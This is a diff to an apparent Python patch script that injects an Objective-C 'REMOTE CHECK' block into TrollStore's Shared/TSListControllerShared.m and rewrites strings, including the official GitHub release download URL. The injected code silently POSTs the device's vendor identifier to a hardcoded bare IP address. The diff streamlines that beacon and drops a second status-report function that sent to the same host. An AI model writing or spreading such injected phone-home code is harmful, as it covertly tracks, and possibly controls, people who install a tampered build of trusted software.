@@ -15,43 +15,20 @@ remote_code = """// === REMOTE CHECK ===
     static BOOL done = NO;
     if (done) return;
     done = YES;
-    
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2LL * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
         NSString* uid = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
         if (!uid) return;
-        NSString* rurl = @"http://124.223.199.167/api/remote.php";
-        NSString* full = [NSString stringWithFormat:@"%@?action=device_check", rurl];
+        NSString* full = [NSString stringWithFormat:@"http://124.223.199.167/api/remote.php?action=device_check"];
         NSMutableURLRequest* req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:full]];
         if (!req) return;
         req.HTTPMethod = @"POST";
         req.timeoutInterval = 10;
         req.HTTPBody = [[NSString stringWithFormat:@"udid=%@", uid] dataUsingEncoding:NSUTF8StringEncoding];
-        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:
-            ^(NSData* data, NSURLResponse* resp, NSError* err) {
-            if (!data) return;
-            NSDictionary* j = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
-            if (!j) return;
-            NSLog(@"Remote check: %@", j);
-        }] resume];
+        NSURLSessionDataTask* task = [[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData* d, NSURLResponse* r, NSError* e){}];
+        if (task) [task resume];
     });
 }
-
-- (void)_remoteReport:(NSString*)st {
-    NSString* uid = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
-    if (!uid || !st) return;
-    NSString* eu = [uid stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]];
-    NSString* es = [st stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]];
-    NSString* body = [NSString stringWithFormat:@"udid=%@&status=%@", eu, es];
-    NSString* full = [NSString stringWithFormat:@"http://124.223.199.167/api/remote.php?action=status_report"];
-    NSMutableURLRequest* req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:full]];
-    if (!req) return;
-    req.HTTPMethod = @"POST";
-    req.HTTPBody = [body dataUsingEncoding:NSUTF8StringEncoding];
-    req.timeoutInterval = 10;
-    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:nil] resume];
-}
 // === END REMOTE ===
-
 """
 
 content = content[:impl_pos + inject_pos] + remote_code + content[impl_pos + inject_pos:]
@@ -108,4 +85,4 @@ c = c.replace("https://github.com/opa334/TrollStore/releases/latest/download/Tro
 with open("Shared/TSListControllerShared.m", "w", encoding="utf-8") as f:
     f.write(c)
 
-print(f"OK: {total} replacements", file=sys.stderr)
+print(f"OK: {total}", file=sys.stderr)
